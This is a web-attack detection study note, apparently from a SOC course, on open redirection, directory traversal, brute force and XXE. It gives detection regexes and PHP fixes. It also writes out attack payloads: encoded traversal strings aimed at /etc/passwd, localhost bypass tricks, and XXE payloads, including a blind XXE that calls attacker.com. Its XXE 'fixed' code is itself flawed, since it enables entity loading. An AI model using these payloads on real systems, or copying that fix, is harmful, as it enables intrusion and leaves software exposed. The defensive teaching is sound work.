# 06 — Detecting Web Attacks - 2 🔍

## Learning Objectives 🎯

- Understand Open Redirection vulnerabilities and their exploitation
- Learn Directory Traversal attack vectors and detection methods
- Master Brute Force attack identification in web applications
- Detect XML External Entity (XXE) attacks through log analysis
- Apply regex patterns for automated attack detection

---

## Key Concepts 💡

### 1. Open Redirection Attacks

**Definition**: Web security vulnerability where a website redirects users to a different URL without proper validation, allowing attackers to trick users into visiting malicious sites.

**Attack Types**:
- **URL-based**: Most common, manipulates URL parameters
- **JavaScript-based**: Uses JS for redirect with untrusted sources
- **Meta refresh-based**: Exploits HTML meta refresh tag
- **Header-based**: Manipulates HTTP headers (Location header)
- **Parameter-based**: Exploits URL/form parameters

**Impact**:
- Phishing attacks (steal credentials, financial data)
- Malware distribution
- Social engineering attacks
- Reputation damage
- Legal/regulatory consequences

### 2. Directory Traversal Attacks

**Definition**: Attack leveraging manipulation of input to access files/directories outside web server's root directory (also known as "dot-dot-slash" attack).

**Key Difference from LFI**:
- **Directory Traversal**: Manipulates input used to access files on web server
- **LFI**: Manipulates input used to include local files within web application

**Attack Vectors**:
- User input (URLs, file paths, form fields)
- Cookies
- HTTP headers (Referer, User-Agent)
- File upload
- Direct requests (brute-forcing paths)
- URL manipulation
- Malicious links

**Impact**:
- Disclosure of sensitive data (password files, config files, user data)
- Execution of arbitrary code
- Denial of service
- System compromise

### 3. Brute Force Attacks

**Definition**: Attack attempting to guess passwords/authentication tokens by systematically trying every possible character combination.

**Vectors**:
- Login brute forcing (username/password combinations)
- Directory brute forcing (hidden files/directories)

**Impact**:
- Denial of service (resource consumption)
- Data leakage (unauthorized access to sensitive data)
- Account takeover
- Password reuse exposure
- Legal and reputational consequences

### 4. XML External Entity (XXE) Attacks

**XML Overview**: Extensible Markup Language for structuring/storing data in human-readable and machine-readable format. Uses tags to define structure, flexible and extensible.

**Definition**: Security vulnerability affecting applications that parse XML input. Attacker injects malicious XML data with external entities controlled by the attacker.

**Attack Vectors**:
- Form fields accepting XML input
- XML file uploads
- APIs accepting XML requests (SOAP, REST)
- XML configuration files

**Impact**:
- Information disclosure (read/write sensitive data)
- Server-side request forgery (SSRF)
- Denial of service (DoS)
- Remote code execution (RCE)

---

## Detection Methods 🔎

### Open Redirection Detection

**Key Indicators**:
- Consecutive requests to query parameters: `?next=`, `?url=`
- Payloads with URL structure: `http://attacker.com` or `attacker.com`

**Bypass Techniques**:
```
Localhost variants:
- http://[::]:25/
- http://①②⑦.⓪.⓪.⓪

CDIR: http://127.0.0.0

Decimal Bypass: http://2130706433/ = http://127.0.0.1

Hexadecimal Bypass: http://0x7f000001/ = http://127.0.0.1

Encoded characters: %2f = /
```

**Detection Regex**:
```regex
/^.*"GET.*\?.*=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.*HTTP\/.*".*$/gm
```
Matches: GET requests with query parameter containing `https://x.com` (encoded)

**Example Detection**:
```
Encoded: ?pro=https%3a%2f%2fgoogle.com
Decoded: ?pro=https://google.com
```
Look for: All requests within seconds, same source IP, encoded redirect parameters

### Directory Traversal Detection

**Key Payloads**:
```
Basic: ../../../etc/passwd
Encoded: ..%2f..%2f..%2fetc%2fpasswd
Double encoded: ..%252f..%252f..%252fetc%252fpasswd
Unicode: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

**Detection Keywords**: `../` (dot-dot-slash), encoded `%2e%2e%2f`, double encoded

**Basic Detection Regex**:
```regex
/^.*"GET.*\?.*=(%2e%2e%2f).+?.*HTTP\/.*".*$/gm
```

**Stricter Regex** (prevents False Positives):
```regex
/^.*"GET.*\?.*=(.+?(?=%2e%2e%2fetc%2f)).+?.*HTTP\/.*".*$/gm
```

**Target Files**:
```
Linux:
- /etc/issue
- /etc/passwd
- /etc/shadow
- /etc/group
- /etc/hosts

Windows:
- c:/boot.ini
- c:/inetpub/logs/logfiles
- c:/inetpub/wwwroot/global.asa
- c:/inetpub/wwwroot/web.config
- c:/sysprep.inf
```

### Brute Force Detection

**Analysis Steps**:
1. Collect authentication logs (successful + failed logins)
2. Look for patterns: high number of failed attempts from specific IP/user account
3. Analyze network traffic for repeated login attempts
4. Deploy IDS/IPS to detect brute force signatures
5. Identify common attack vectors (dictionary attacks, password spraying)
6. Monitor vulnerable user accounts (weak passwords)

**Log Analysis**:
```
Failed login: HTTP 401/403 status codes
Successful login: HTTP 200 or 302 (redirect)
Check: Cookie headers (PHPSESSID, login values)
```

**Detection Regex**:
```regex
/^(\S+) \S+ \S+ \[.*?\] "(POST|GET) \/login\.php.*?" (401|403) \d+ ".*?" ".*?"/gm
```
Matches: Failed login attempts (401/403) to login.php, captures client IP

**Response Actions**:
- IP blocking with Fail2ban
- Manual IP blocking in nginx config:
```nginx
deny 192.168.1.100;
```

### XXE Detection

**Key Payloads**:
```xml
Basic XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

Blind XXE:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.xml">]>

PHP Filter:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

**Detection Keywords** in logs:
- `DOCTYPE`
- `ELEMENT`
- `ENTITY`

**Detection Regex**:
```regex
^(\S+) - (\S+) \[(.*?)\] "(\S+) (.*?)\?(?=.*?\b21DOCTYPE\b).*? HTTP\/\d\.\d" (\d+) (\d+) "(.*?)" "(.*?)"
```
Note: `21` = encoded `!` character (`!DOCTYPE` = `%21DOCTYPE`)

**Example Nginx Log**:
```
123.45.67.89 - - [30/Apr/2023:12:34:57] "GET /processXML?xml=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E HTTP/1.1" 200 143
```

---

## Prevention Methods 🛡️

### Open Redirection Prevention

1. **Validate and sanitize input**: Check URL parameters conform to expected formats
2. **Use whitelist approach**: Define trusted domains/URLs for redirection
3. **Avoid user-controlled data in redirects**: Use HTTP headers or server-side redirects
4. **Implement authorization/authentication**: Verify user legitimacy
5. **Secure coding practices**: Use secure libraries, keep software updated
6. **User education**: Warn about suspicious URLs
7. **Stay informed**: Follow OWASP Top Ten guidelines

**Example Fix**:
```php
// Vulnerable
header("Location: " . $_GET['url']);

// Fixed
$url = $_GET['url'];
if (filter_var($url, FILTER_VALIDATE_URL)) {
    header("Location: " . $url);
} else {
    echo "Invalid URL";
}
```

### Directory Traversal Prevention

1. **Input validation and sanitization**: Use regex to check valid characters
2. **Access controls**: Limit web server access to required files only
3. **Relative file paths**: Use relative instead of absolute paths
4. **Whitelisting**: Allow only specific characters in file names
5. **Secure coding practices**: Avoid direct user input in file paths
6. **Web Application Firewall (WAF)**: Detect and block traversal attempts

**Example Fix**:
```php
// Vulnerable
$file = $_GET['file'];
$full_path = $_SERVER['DOCUMENT_ROOT'] . "/" . $file;
readfile($full_path);

// Fixed
$file = $_GET['file'];
if (preg_match('/^[a-zA-Z0-9_-]+$/', $file)) {
    $full_path = realpath($_SERVER['DOCUMENT_ROOT'] . "/" . $file);
    if (strpos($full_path, $_SERVER['DOCUMENT_ROOT']) === 0 && file_exists($full_path)) {
        readfile($full_path);
    }
}
```

### Brute Force Prevention

1. **Account lockout policies**: Lock account after X failed attempts
2. **Implement CAPTCHA**: Detect automated login attempts
3. **Rate limiting**: Limit login attempts per time period (e.g., 5/minute)
4. **Multi-factor authentication (MFA)**: Require additional authentication factors
5. **Monitor login attempts**: Detect suspicious patterns
6. **Strong passwords**: Enforce password policies
7. **WAF features**:
   - IP blocking for excessive attempts
   - User behavior analysis for anomaly detection

### XXE Prevention

1. **Disable external entities**: Set parser configuration to block external entities
2. **Input validation and sanitization**: Check for malicious XML (nested entities, injections)
3. **Use secure parsers**: Use latest version designed to prevent XXE
4. **Whitelist filtering**: Block entities/DTDs not on whitelist
5. **Access controls**: Restrict access to sensitive data/resources
6. **Secure coding practices**: Implement input validation, error handling

**Example Fix**:
```php
// Vulnerable
$xml = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xml);

// Fixed
libxml_disable_entity_loader(true);
$xml = file_get_contents('php://input');
if (preg_match('/^[a-zA-Z0-9_]+$/', $xml)) {
    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
}
```

---

## Quick Reference 📋

### Detection Summary Table

| Attack Type | Key Indicator | Detection Regex | HTTP Status |
|------------|---------------|-----------------|-------------|
| Open Redirection | `?url=`, `?next=` with external URLs | `/^.*"GET.*\?.*=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.*HTTP\/.*".*$/gm` | 302 |
| Directory Traversal | `../`, `%2e%2e%2f`, target files | `/^.*"GET.*\?.*=(%2e%2e%2f).+?.*HTTP\/.*".*$/gm` | 200/404 |
| Brute Force | Multiple failed logins from same IP | `/^(\S+) \S+ \S+ \[.*?\] "(POST\|GET) \/login\.php.*?" (401\|403) \d+ ".*?" ".*?"/gm` | 401/403 |
| XXE | `!DOCTYPE`, `!ENTITY` in XML parameters | `^(\S+) - (\S+) \[(.*?)\] "(\S+) (.*?)\?(?=.*?\b21DOCTYPE\b).*? HTTP\/\d\.\d" (\d+) (\d+) "(.*?)" "(.*?)"` | 200 |

### Common Encoding Techniques

```
URL Encoding:
/ = %2f
. = %2e
! = %21

Double Encoding:
/ = %252f
. = %252e

Unicode:
/ = %c0%af
```

---

## SOC Focus Points 🎯

1. **Log Analysis Priority**: Focus on query parameters in GET/POST requests for malicious payloads
2. **Pattern Recognition**: Look for encoded characters, repeated requests, same source IPs within seconds
3. **False Positive Reduction**: Use stricter regex patterns targeting specific attack signatures
4. **Response Actions**: Implement IP blocking (Fail2ban), account lockouts, WAF rules
5. **Target File Monitoring**: Watch for access attempts to sensitive files (`/etc/passwd`, `/etc/shadow`, `boot.ini`)
6. **XML Input Validation**: Any endpoint accepting XML should be monitored for `DOCTYPE`, `ENTITY` keywords
7. **Authentication Monitoring**: Track failed login ratios, successful logins after multiple failures
8. **Tool Detection**: Look for high request frequency, consistent User-Agent strings indicating automation


